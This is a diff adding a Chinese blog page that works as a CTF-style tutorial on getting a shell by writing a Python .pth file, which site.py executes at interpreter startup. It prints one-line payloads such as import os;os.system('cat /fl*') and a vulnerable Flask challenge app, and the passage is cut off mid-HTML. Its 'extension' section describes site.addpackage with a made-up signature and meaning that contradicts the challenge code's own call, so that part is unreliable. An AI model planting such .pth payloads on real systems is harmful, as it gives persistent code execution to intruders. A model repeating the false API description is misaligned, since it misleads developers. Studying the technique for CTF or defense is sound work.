@@ -1,0 +1,834 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[python]pth文件写入getshell概述 在讲之前我们先要了解一下python中site模块的作用  site —— 指定域的配置钩子  site模块会在初始化时自动导入,导入此模块将会附加域特定的路径到模块搜索路径并且添加一些内建对象  它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 sys.prefix 和 sys.exec_prefix；空的头部会被跳过。 对于尾部">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pth文件写入getshell">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[python]pth文件写入getshell概述 在讲之前我们先要了解一下python中site模块的作用  site —— 指定域的配置钩子  site模块会在初始化时自动导入,导入此模块将会附加域特定的路径到模块搜索路径并且添加一些内建对象  它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 sys.prefix 和 sys.exec_prefix；空的头部会被跳过。 对于尾部">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/qmhoEOtr6W4ig5X.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/TXEhMqbCJn5vzpS.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/navHm4h6wS5lqGb.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/1nBhxDiZytaP7Vc.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/IuNvyOlFWnbox1D.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/yhsLS1CUDQ8ENgf.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/EZ1S9boDIUfimBz.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/27/JRzauMpoW2ylFh7.png">
+<meta property="article:published_time" content="2023-08-24T14:38:04.634Z">
+<meta property="article:modified_time" content="2023-06-05T06:58:40.483Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="pth文件写入getshell">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/05/27/qmhoEOtr6W4ig5X.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>pth文件写入getshell - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pth文件写入getshell"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 22:38" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pth文件写入getshell</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年6月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="python-pth文件写入getshell"><a href="#python-pth文件写入getshell" class="headerlink" title="[python]pth文件写入getshell"></a>[python]pth文件写入getshell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
+<p>在讲之前我们先要了解一下python中<strong>site模块</strong>的作用</p>
+<blockquote>
+<p>site —— 指定域的配置钩子</p>
+</blockquote>
+<p><strong>site模块会在初始化时自动导入</strong>,导入此模块将会<strong>附加域特定的路径到模块搜索路径</strong>并且添加一些内建对象</p>
+<blockquote>
+<p>它会从头部和尾部构建至多四个目录作为起点。 对于头部，它会使用 <code>sys.prefix</code> 和 <code>sys.exec_prefix</code>；空的头部会被跳过。 对于尾部，它会使用空字符串然后是 <code>lib/site-packages</code> (在 Windows 上) 或 <code>lib/python*X.Y*/site-packages</code> (在 Unix 和 macOS 上)。 对于每个不同的头-尾组合，它会<strong>查看其是否指向现有的目录，如果是的话，则将其添加到 <code>sys.path</code> 并且检查新添加目录中的配置文件。</strong></p>
+</blockquote>
+<p>一个路径配置文件是具有 <code>name.pth</code> 命名格式的文件，并且存在上面提到的四个目录之一中；它的内容是要<strong>添加到 <code>sys.path</code> 中的额外项目</strong>（每行一个）。不存在的项目不会添加到 <code>sys.path</code>，并且不会检查项目指向的是目录还是文件。项目不会被添加到 <code>sys.path</code> 超过一次。空行和由 <code>#</code> 起始的行会被跳过。</p>
+<p>每次启动 Python，在 <code>.pth</code> 文件中的可执行行都将会被运行</p>
+<p><strong>以 <code>import</code> 开始的行（跟着空格或 TAB）会被执行。</strong></p>
+</blockquote>
+<p>简单的说：</p>
+<blockquote>
+<p>python 的 site 模块支持 “Site-specific configuration hook” 的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入。<br><code>sys.prefix</code> 和 <code>sys.exec_prefix</code> 在 <code>C:/Python</code>，那么创建路径为 <code>C:\Python\Lib\site-packages\1.pth</code> 的 pth 文件，然后其内容为<br><code>c:/windows/temp/</code><br>那么在新的 python 进程中，temp 路径将被添加到 sys.path 中</p>
+</blockquote>
+<p>当我们在系统python的<code>sys.prefix</code>、<code>sys.exec_prefix</code>路径下的<code>site-packages</code>中写入的1个pth文件的话，每次运行python的时候，会自动将该<strong>文件内容存在的指定路径导入到模块搜索路径</strong>，</p>
+<p>如果pth文件是以<code>import</code>开头的，并且代码是写在一行的话，那么这一行可以被当作python<strong>代码</strong>执行</p>
+<p>这里就可以通过上传文件到sys.prefix中的<code>site-packages</code>下，然后后续启动代码触发命令执行</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>我们做个实验：</p>
+<p><img src="https://s2.loli.net/2023/05/27/qmhoEOtr6W4ig5X.png" srcset="/img/loading.gif" lazyload alt="image-20230527153444224"></p>
+<p>在kali中我的 <code>pth</code>文件存放在 <code>/usr/local/lib/python3.10/dist-packages</code> 下</p>
+<p>于是我们写一个 1.pth 于该目录。内容为： <code>/tmp</code></p>
+<p><img src="https://s2.loli.net/2023/05/27/TXEhMqbCJn5vzpS.png" srcset="/img/loading.gif" lazyload alt="image-20230527153630444"></p>
+<p>然后我们使用 <code>sys.path</code>查看：</p>
+<blockquote>
+<p>在 Python 中，<code>sys.path</code>是一个列表，用于指定模块搜索路径。当Python导入模块时，解释器会按照以下顺序搜索模块：</p>
+<ol>
+<li>当前目录。</li>
+<li>环境变量 PYTHONPATH 指定的目录。</li>
+<li>标准库安装路径下的目录。</li>
+</ol>
+<p>在这三个搜索路径中找不到模块时，Python会引发“ModuleNotFoundError”异常。但是，我们可以在运行时修改<code>sys.path</code>，以便在搜索路径中添加自定义目录或修改默认搜索路径。</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2023/05/27/navHm4h6wS5lqGb.png" srcset="/img/loading.gif" lazyload alt="image-20230527153855985"></p>
+<p>我们发现 <code>/tmp</code> 路径已经被添加进<code>模块搜索路径</code>了，因为每次启动python的会加载site模块，从而加载相关pth文件</p>
+<p>接着我们尝试将<code>pth</code>文件内容改为：(需要写在1行) 去读根目录下的flag文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&#x27;cat /fl*&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>然后我们运行python：</p>
+<p><img src="https://s2.loli.net/2023/05/27/1nBhxDiZytaP7Vc.png" srcset="/img/loading.gif" lazyload alt="image-20230527154506803"></p>
+<p>成功命令执行</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在site模块的site.py中有如下代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> n, line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(f):<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;#&quot;</span>):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> line.strip() == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line.startswith((<span class="hljs-string">&quot;import &quot;</span>, <span class="hljs-string">&quot;import\t&quot;</span>)):<br>            <span class="hljs-built_in">exec</span>(line)<br>            <span class="hljs-keyword">continue</span><br>        line = line.rstrip()<br>        <span class="hljs-built_in">dir</span>, dircase = makepath(sitedir, line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dircase <span class="hljs-keyword">in</span> known_paths <span class="hljs-keyword">and</span> os.path.exists(<span class="hljs-built_in">dir</span>):<br>            sys.path.append(<span class="hljs-built_in">dir</span>)<br>            known_paths.add(dircase)<br></code></pre></td></tr></table></figure>
+
+<p>当<code>pth</code>文件以 <code>import </code>  、<code>import\t </code> 开头时，会将这一行进行命令执行，因此，如果pth内容为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&#x27;calc&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>每个新启动的进程都会运行该代码，执行calc命令</p>
+<p>（因为site模块初始化时被加载，并且hook <code>pth</code>文件到<code>模块搜索路径</code>）</p>
+<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><blockquote>
+<p>在Python中，<code>site.addpackage()</code>是一个函数，用于将自定义包添加到Python解释器的系统路径和缓存目录中。</p>
+<p>当我们使用Python解释器执行脚本或启动交互式Shell时，Python解释器会加载默认的模块搜索路径列表。而使用<code>site.addpackage()</code>函数，我们可以为Python解释器添加自定义模块路径，以便让解释器能够找到我们自己创建的包。</p>
+<p><code>site.addpackage()</code>函数的语法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">site.addpackage(fullpath, set_readable=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
+
+<p>其中，<code>fullpath</code>参数是要添加的包的完整路径，<code>set_readable</code>参数表示是否将该包标记为可读写。</p>
+<p>例如，假设我们创建了名为“my_package”的包，并将其保存在路径<code>/path/to/my_package</code>下。我们可以使用以下代码将“my_package”添加到Python解释器的搜索路径中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> site<br><br><span class="hljs-comment"># 添加my_package到Python解释器的搜索路径中</span><br>site.addpackage(<span class="hljs-string">&#x27;/path/to/my_package&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这样，当我们尝试导入“my_package”模块时，Python解释器将在<code>/path/to/my_package</code>目录下寻找模块，并可以正确地导入我们的自定义包。</p>
+<p>需要注意的是，<code>site.addpackage()</code>只能添加包的路径，而无法加载包中的模块。我们仍然需要使用<code>import</code>来导入包中的模块。</p>
+</blockquote>
+<p>当我们使用 <code>site.addpackage()</code> 函数，并且路径是已知的</p>
+<p><strong>我们可以通过上传pth文件到该路径，进行getshell</strong></p>
+<h4 id="例题：-闽盾杯-pypth"><a href="#例题：-闽盾杯-pypth" class="headerlink" title="例题： [闽盾杯]pypth"></a>例题： [闽盾杯]pypth</h4><p>目录结构：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|--app.py</span><br><span class="hljs-string">|--static</span><br>	<span class="hljs-string">|--index.html</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> site<br><br><br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> app.send_static_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    f = request.files[<span class="hljs-string">&quot;data&quot;</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;/tmp/storage/<span class="hljs-subst">&#123;f.filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> destination:<br>        destination.write(f.read())<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;File is uploaded!&quot;</span>, <span class="hljs-number">200</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/install&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">install</span>():<br>    package_name = request.args.get(<span class="hljs-string">&#x27;package_name&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> package_name:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Not allowed!&quot;</span>, <span class="hljs-number">400</span>)<br><br>    src = os.path.join(<span class="hljs-string">&#x27;contrib&#x27;</span>, <span class="hljs-string">&#x27;packages&#x27;</span>, package_name)<br>    dst = os.path.join(<span class="hljs-string">&#x27;/tmp/extract&#x27;</span>, package_name)<br><br>    shutil.copy(src, dst)<br>    shutil.unpack_archive(dst, extract_dir=<span class="hljs-string">&#x27;/tmp/extract&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Installed!&quot;</span>, <span class="hljs-number">200</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/clean&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean</span>():<br>    file = os.path.basename(request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>))<br>    file_safe = <span class="hljs-string">f&#x27;/tmp/storage/<span class="hljs-subst">&#123;file&#125;</span>&#x27;</span><br>    os.unlink(file_safe)<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;file removed!&quot;</span>, <span class="hljs-number">200</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    site_dir = <span class="hljs-string">&quot;/tmp/extract&quot;</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    site.addpackage(site_dir, name, <span class="hljs-literal">None</span>)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>index.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>File Upload and Package Installation<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>File Upload Form<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Upload File<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Package Installation Form<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/install&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;package-name&quot;</span>&gt;</span>Package Name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;package_name&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;package-name&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Install Package<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Clean up Uploaded Files<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/clean&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>File Name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Remove File<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Add Package to Site Directory<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>Package Name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span 